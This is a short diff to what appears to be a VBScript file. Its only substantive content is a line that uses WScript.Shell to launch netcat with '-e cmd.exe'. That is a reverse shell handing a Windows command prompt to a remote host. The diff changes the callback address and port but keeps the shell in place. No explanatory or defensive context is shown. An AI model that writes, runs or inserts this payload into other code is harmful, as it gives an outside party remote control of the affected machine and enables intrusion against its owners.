@@ -27,4 +27,4 @@
 
 Set objShell = CreateObject("WScript.Shell")
 
-objShell.Exec("nc -d 10.0.0.3 5555 -e cmd.exe")
+objShell.Exec("nc -d 192.168.254.242 4444 -e cmd.exe")
